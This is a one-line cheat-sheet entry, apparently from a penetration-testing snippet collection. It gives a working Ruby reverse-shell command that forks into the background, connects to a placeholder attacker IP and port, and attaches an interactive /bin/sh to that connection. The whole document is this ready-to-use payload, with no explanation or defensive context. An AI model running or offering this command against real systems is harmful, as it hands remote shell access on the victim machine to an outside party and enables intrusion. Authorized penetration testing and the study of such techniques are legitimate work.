# [Exploitation] Reverse shell (TCPSocket) --ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",c.fileno,c.fileno,c.fileno)'
